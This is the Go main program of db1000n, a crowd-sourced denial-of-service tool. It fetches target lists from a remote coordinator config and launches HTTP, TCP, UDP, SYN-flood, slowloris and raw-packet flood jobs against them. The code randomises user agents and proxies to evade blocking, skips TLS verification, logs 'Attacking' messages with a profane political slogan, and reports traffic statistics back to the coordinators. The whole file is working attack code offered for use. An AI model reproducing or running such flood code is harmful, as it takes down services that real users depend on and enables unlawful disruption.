// MIT License

// Copyright (c) [2022] [Arriven (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"

	"github.com/Arriven/db1000n/logs"
	"github.com/Arriven/db1000n/metrics"
	"github.com/Arriven/db1000n/packetgen"
	"github.com/Arriven/db1000n/slowloris"
	"github.com/Arriven/db1000n/synfloodraw"
	"github.com/Arriven/db1000n/template"
	"github.com/Arriven/db1000n/utils"
)

// JobArgs comment for linter
type JobArgs = json.RawMessage

type job = func(context.Context, *logs.Logger, JobArgs) error

// JobConfig comment for linter
type JobConfig struct {
	Type  string
	Count int
	Args  JobArgs
}

var jobs = map[string]job{
	"http":       httpJob,
	"tcp":        tcpJob,
	"udp":        udpJob,
	"syn-flood":  synFloodJob,
	"slow-loris": slowLoris,
	"packetgen":  packetgenJob,
}

// Config comment for linter
type Config struct {
	Jobs []JobConfig
}

// BasicJobConfig comment for linter
type BasicJobConfig struct {
	IntervalMs int `json:"interval_ms,omitempty"`
	Count      int `json:"count,omitempty"`

	iter int
}

// Next comment for linter
func (c *BasicJobConfig) Next(ctx context.Context) bool {
	select {
	case <-ctx.Done():
		return false
	default:
	}

	if c.Count <= 0 {
		return true
	}

	c.iter++

	return c.iter <= c.Count
}

func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	defer panicHandler()
	type HTTPClientConfig struct {
		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
		Timeout         *time.Duration `json:"timeout"`
		MaxIdleConns    *int           `json:"max_idle_connections"`
		ProxyURLs       string         `json:"proxy_urls"`
		Async           bool           `json:"async"`
	}
	type httpJobConfig struct {
		BasicJobConfig
		Path    string
		Method  string
		Body    json.RawMessage
		Headers map[string]string
		Client  json.RawMessage
	}

	var jobConfig httpJobConfig
	if err := json.Unmarshal(args, &jobConfig); err != nil {
		l.Error("error parsing json: %v", err)
		return err
	}

	var clientConfig HTTPClientConfig
	if err := json.Unmarshal([]byte(template.Execute(string(jobConfig.Client))), &clientConfig); err != nil {
		l.Debug("error parsing json: %v", err)
	}

	timeout := time.Second * 90
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	var proxy func(r *http.Request) (*url.URL, error)
	if len(clientConfig.ProxyURLs) > 0 {
		l.Debug("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)
		var proxyURLs []string
		err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs)
		if err == nil {
			l.Debug("proxyURLs: %v", proxyURLs)
			// Return random proxy from the list
			proxy = func(r *http.Request) (*url.URL, error) {
				if len(proxyURLs) == 0 {
					return nil, fmt.Errorf("proxylist is empty")
				}
				proxyID := rand.Intn(len(proxyURLs))
				proxyString := proxyURLs[proxyID]
				u, err := url.Parse(proxyString)
				if err != nil {
					u, err = url.Parse(r.URL.Scheme + proxyString)
					if err != nil {
						l.Warning("failed to parse proxy: %v\nsending request directly", err)
					}
				}
				return u, nil
			}
		} else {
			l.Debug("failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
		}
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
			Dial: (&net.Dialer{
				Timeout:   timeout,
				KeepAlive: timeout,
			}).Dial,
			MaxIdleConns:          maxIdleConns,
			IdleConnTimeout:       timeout,
			TLSHandshakeTimeout:   timeout,
			ExpectContinueTimeout: timeout,
			Proxy:                 proxy,
		},
		Timeout: timeout,
	}
	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for jobConfig.Next(ctx) {
		req, err := http.NewRequest(template.Execute(jobConfig.Method), template.Execute(jobConfig.Path),
			bytes.NewReader([]byte(template.Execute(string(jobConfig.Body)))))
		if err != nil {
			l.Debug("error creating request: %v", err)
			continue
		}

		select {
		case <-ticker.C:
			l.Info("Attacking %v", jobConfig.Path)
		default:
		}

		// Add random user agent
		req.Header.Set("user-agent", uarand.GetRandom())
		for key, value := range jobConfig.Headers {
			trafficMonitor.Add(len(key))
			trafficMonitor.Add(len(value))
			req.Header.Add(template.Execute(key), template.Execute(value))
		}
		trafficMonitor.Add(len(jobConfig.Method))
		trafficMonitor.Add(len(jobConfig.Path))
		trafficMonitor.Add(len(jobConfig.Body))

		startedAt := time.Now().Unix()
		l.Debug("%s %s started at %d", jobConfig.Method, jobConfig.Path, startedAt)

		sendRequest := func() {
			resp, err := client.Do(req)
			if err != nil {
				l.Debug("error sending request %v: %v", req, err)
				return
			}

			finishedAt := time.Now().Unix()
			resp.Body.Close() // No need for response
			if resp.StatusCode >= 400 {
				l.Debug("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, finishedAt, resp.StatusCode)
			} else {
				l.Debug("%s %s finished at %d", jobConfig.Method, jobConfig.Path, finishedAt)
			}
		}

		if clientConfig.Async {
			go sendRequest()
		} else {
			sendRequest()
		}

		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}
	return nil
}

// RawNetJobConfig comment for linter
type RawNetJobConfig struct {
	BasicJobConfig
	Address string
	Body    json.RawMessage
}

func tcpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	defer panicHandler()
	type tcpJobConfig struct {
		RawNetJobConfig
	}
	var jobConfig tcpJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}
	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	tcpAddr, err := net.ResolveTCPAddr("tcp", strings.TrimSpace(template.Execute(jobConfig.Address)))
	if err != nil {
		return err
	}
	for jobConfig.Next(ctx) {
		startedAt := time.Now().Unix()
		l.Debug("%s started at %d", jobConfig.Address, startedAt)

		conn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err != nil {
			l.Debug("error connecting to [%v]: %v", tcpAddr, err)
			continue
		}

		_, err = conn.Write([]byte(template.Execute(string(jobConfig.Body))))
		trafficMonitor.Add(len(jobConfig.Body))

		finishedAt := time.Now().Unix()
		if err != nil {
			l.Debug("%s failed at %d with err: %s", jobConfig.Address, finishedAt, err.Error())
		} else {
			l.Debug("%s started at %d", jobConfig.Address, finishedAt)
		}
		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}
	return nil
}

func udpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	defer panicHandler()
	type udpJobConfig struct {
		RawNetJobConfig
	}
	var jobConfig udpJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}
	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	udpAddr, err := net.ResolveUDPAddr("udp", strings.TrimSpace(template.Execute(jobConfig.Address)))
	if err != nil {
		return err
	}
	startedAt := time.Now().Unix()
	l.Debug("%s started at %d", jobConfig.Address, startedAt)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		l.Debug("error connecting to [%v]: %v", udpAddr, err)
		return err
	}

	for jobConfig.Next(ctx) {
		_, err = conn.Write([]byte(template.Execute(string(jobConfig.Body))))
		trafficMonitor.Add(len(jobConfig.Body))

		finishedAt := time.Now().Unix()
		if err != nil {
			l.Debug("%s failed at %d with err: %s", jobConfig.Address, finishedAt, err.Error())
		} else {
			l.Debug("%s started at %d", jobConfig.Address, finishedAt)
		}
		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}
	return nil
}

func synFloodJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	defer panicHandler()
	type synFloodJobConfig struct {
		BasicJobConfig
		Host          string
		Port          int
		PayloadLength int    `json:"payload_len"`
		FloodType     string `json:"flood_type"`
	}
	var jobConfig synFloodJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()
	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
}

func slowLoris(ctx context.Context, l *logs.Logger, args JobArgs) error {
	defer panicHandler()
	var jobConfig *slowloris.Config
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}

	if len(jobConfig.Path) == 0 {
		l.Error("path is empty")

		return errors.New("path is empty")
	}

	if jobConfig.ContentLength == 0 {
		jobConfig.ContentLength = 1000 * 1000
	}

	if jobConfig.DialWorkersCount == 0 {
		jobConfig.DialWorkersCount = 10
	}

	if jobConfig.RampUpInterval == 0 {
		jobConfig.RampUpInterval = 1 * time.Second
	}

	if jobConfig.SleepInterval == 0 {
		jobConfig.SleepInterval = 10 * time.Second
	}

	if jobConfig.DurationSeconds == 0 {
		jobConfig.DurationSeconds = 10 * time.Second
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()
	l.Debug("sending slow loris with params: %v", jobConfig)

	return slowloris.Start(l, jobConfig)
}

func packetgenJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	defer panicHandler()
	type packetgenJobConfig struct {
		BasicJobConfig
		Packet json.RawMessage
		Host   string
		Port   string
	}
	var jobConfig packetgenJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		l.Error("error parsing json: %v", err)
		return err
	}

	host := template.Execute(jobConfig.Host)
	port, err := strconv.Atoi(template.Execute(jobConfig.Port))
	if err != nil {
		l.Error("error parsing port: %v", err)
		return err
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())

	for jobConfig.Next(ctx) {
		select {
		case <-ticker.C:
			l.Info("Attacking %v:%v", jobConfig.Host, jobConfig.Port)
		default:
		}

		packetConfigBytes := []byte(template.Execute(string(jobConfig.Packet)))
		l.Debug("[packetgen] parsed packet config template:\n%s", string(packetConfigBytes))
		var packetConfig packetgen.PacketConfig
		err := json.Unmarshal(packetConfigBytes, &packetConfig)
		if err != nil {
			l.Error("error parsing json: %v", err)
			return err
		}
		packetConfigBytes, err = json.Marshal(packetConfig)
		if err != nil {
			l.Error("error marshaling back to json: %v", err)
			return err
		}
		l.Debug("[packetgen] parsed packet config:\n%v", string(packetConfigBytes))
		len, err := packetgen.SendPacket(packetConfig, host, port)
		if err != nil {
			l.Error("error sending packet: %v", err)
			return err
		}
		trafficMonitor.Add(len)
	}
	return nil
}

func fetchConfig(configPath string) (*Config, error) {
	defer panicHandler()

	var configBytes []byte
	if configURL, err := url.ParseRequestURI(configPath); err == nil {
		resp, err := http.Get(configURL.String())
		if err != nil {
			return nil, err
		}

		defer resp.Body.Close()

		if resp.StatusCode < 200 || resp.StatusCode > 299 {
			return nil, fmt.Errorf("error fetching config, code %d", resp.StatusCode)
		}

		if configBytes, err = io.ReadAll(resp.Body); err != nil {
			return nil, err
		}
	} else if configBytes, err = os.ReadFile(configPath); err != nil {
		return nil, err
	}

	var config Config
	if err := json.Unmarshal(configBytes, &config); err != nil {
		fmt.Printf("error parsing json config: %v\n", err)
		return nil, err
	}

	return &config, nil
}

func dumpMetrics(l *logs.Logger, path, name, clientID string) {
	defer panicHandler()

	bytesPerSecond := metrics.Default.Read(name)
	if bytesPerSecond > 0 {
		l.Info("Атака проводиться успішно! Руський воєнний корабль іди нахуй!\n")
		l.Info("Attack is successful! Russian warship, go fuck yourself!\n")
		l.Info("The app is generating approximately %v bytes per second\n", bytesPerSecond)
		utils.ReportStatistics(int64(bytesPerSecond), clientID)
	} else {
		l.Warning("The app doesn't seem to generate any traffic, please contact your admin")
	}
	if path == "" {
		return
	}
	type metricsDump struct {
		BytesPerSecond int `json:"bytes_per_second"`
	}
	dump := &metricsDump{
		BytesPerSecond: bytesPerSecond,
	}
	dumpBytes, err := json.Marshal(dump)
	if err != nil {
		l.Warning("failed marshaling metrics: %v", err)
		return
	}
	// TODO: use proper ip
	url := fmt.Sprintf("%s?id=%s", path, clientID)
	resp, err := http.Post(url, "application/json", bytes.NewReader(dumpBytes))
	if err != nil {
		l.Warning("failed sending metrics: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusAccepted {
		l.Warning("bad response when sending metrics. code %v", resp.StatusCode)
	}
}

func panicHandler() {
	if err := recover(); err != nil {
		logs.Default.Warning("caught panic: %v\n some of the attacks may be unsupported on your system", err)
	}
}

func updateConfig(configPath, backupConfig string) (config *Config, err error) {
	configPaths := strings.Split(configPath, ",")
	for _, path := range configPaths {
		config, err = fetchConfig(path)
		if err == nil {
			return config, nil
		}
	}
	err = json.Unmarshal([]byte(backupConfig), &config)
	return config, err
}

func main() {
	var configPath string
	var backupConfig string
	var refreshTimeout time.Duration
	var logLevel logs.Level
	var help bool
	var metricsPath string
	flag.StringVar(&configPath, "c", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json", "path to config files, separated by a comma, each path can be a web endpoint")
	flag.StringVar(&backupConfig, "b", utils.DefaultConfig, "raw backup config in case the primary one is unavailable")
	flag.DurationVar(&refreshTimeout, "r", time.Minute, "refresh timeout for updating the config")
	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error")
	flag.BoolVar(&help, "h", false, "print help message and exit")
	flag.StringVar(&metricsPath, "m", "", "path where to dump usage metrics, can be URL or file, empty to disable")
	flag.Parse()
	if help {
		flag.CommandLine.Usage()
		return
	}

	l := logs.New(logLevel)
	clientID := uuid.New().String()

	var cancel context.CancelFunc
	defer func() {
		cancel()
	}()

	for {
		config, err := updateConfig(configPath, backupConfig)
		if err != nil {
			l.Warning("fetching json config: %v\n", err)
			continue
		}

		if cancel != nil {
			cancel()
		}

		var ctx context.Context
		ctx, cancel = context.WithCancel(context.Background())
		for _, jobDesc := range config.Jobs {
			job, ok := jobs[jobDesc.Type]
			if !ok {
				l.Warning("no such job - %s", jobDesc.Type)
				continue
			}

			if jobDesc.Count < 1 {
				jobDesc.Count = 1
			}

			for i := 0; i < jobDesc.Count; i++ {
				go job(ctx, l, jobDesc.Args)
			}
		}

		time.Sleep(refreshTimeout)
		dumpMetrics(l, metricsPath, "traffic", clientID)
	}
}
